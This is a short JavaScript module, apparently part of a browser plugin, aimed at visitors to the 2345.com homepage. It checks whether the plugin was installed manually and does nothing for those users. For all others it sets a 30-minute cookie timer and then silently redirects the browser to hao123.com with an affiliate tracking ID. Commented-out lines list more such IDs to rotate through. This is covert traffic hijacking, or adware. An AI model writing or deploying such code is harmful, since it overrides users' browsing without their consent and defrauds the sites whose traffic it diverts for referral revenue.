__tk__define(function (require, exports, module) {
  var utils = require('../utils');

  // 自主安装渠道的插件不弹
  if (utils.isManualDId) {
    return;
  }

  var url = utils.href;

  if (url === 'http://www.2345.com/' || url === 'http://2345.com/' ||
    url.match(/^http:\/\/www\.2345\.com\/\?.*/) || url.match(/^http:\/\/2345\.com\/\?.*/)) {
    // 每30分钟随机跳转到hao123的链接
    utils.setTimer({
      cookie: {
        name: 'TK2345Ref',
        expireUnit: 'min',
        expireTime: 30,
        host: '2345.com'
      },
      callback: function () {
        /*utils.randomUrlJump([
         'http://www.hao123.com/?tn=96363607_hao_pg',
         'http://www.hao123.com/?tn=92253950_hao_pg',
         'http://www.hao123.com/?tn=99033465_hao_pg',
         'http://www.hao123.com/?tn=96206083_hao_pg',
         'http://www.hao123.com/?tn=92050262_hao_pg'
         ]);*/
        //document.location.href = 'http://www.hao123.com/?tn=96206083_hao_pg';
        document.location.href = 'http://www.hao123.com/?tn=96000106_hao_pg';
      }
    });
  }
});
